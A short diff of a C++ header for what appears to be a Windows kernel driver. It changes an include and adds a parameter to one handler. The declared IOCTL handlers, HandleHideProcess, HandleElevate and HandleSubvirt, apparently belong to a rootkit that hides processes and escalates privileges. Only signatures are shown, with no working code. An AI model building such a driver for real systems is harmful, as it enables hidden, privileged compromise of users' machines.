@@ -1,10 +1,10 @@
 #pragma once
-#include <Ntifs.h>
+#include <ntddk.h>
 
 namespace IoctlHandlers {
 
 	NTSTATUS HandleHideProcess(PIRP pIrp);
 	NTSTATUS HandleElevate(PIRP pIrp);
-	NTSTATUS HandleSubvirt();
+	NTSTATUS HandleSubvirt(PIRP pIrp);
 	NTSTATUS HandleTestConnection(PIRP pIrp, ULONG bufferSize);
 }
